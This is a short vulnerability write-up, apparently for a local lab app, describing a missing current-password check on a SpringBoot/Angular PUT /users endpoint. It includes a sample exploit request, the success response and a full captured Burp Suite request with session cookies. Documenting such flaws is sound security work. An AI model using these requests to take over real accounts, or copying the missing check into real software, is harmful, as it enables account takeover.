# Lack Password Change Validation/Check
It is widely acknowledged that for users to change a password they ought to be questioned for their current password.  This prevents session hijacks from changing the user's password after gaining control.

## Exploitation
**Prerequisites:** _Authenticated_

**Location:** _PUT /users_

SpringBoot and Angular code lack any validating parameter for the current password. To exploit simply means to change the password as this is exactly what a session hijacker would do.  Below is an exploitation example:

    PUT /users
    raw:
    {
        "newPassword" : "password",
        "username" : "timmy"
    }

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Password updated successfully."
    }

## Burp Suite Example Exploitation

    PUT /users HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 52
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    X-XSRF-TOKEN: 877dd681-4a9f-41f0-ae74-d1ada25aab32
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=877dd681-4a9f-41f0-ae74-d1ada25aab32; JSESSIONID=1C77B365979B077008298700287FA604
    Connection: close

    {"username":"timmy","newPassword":"password"}

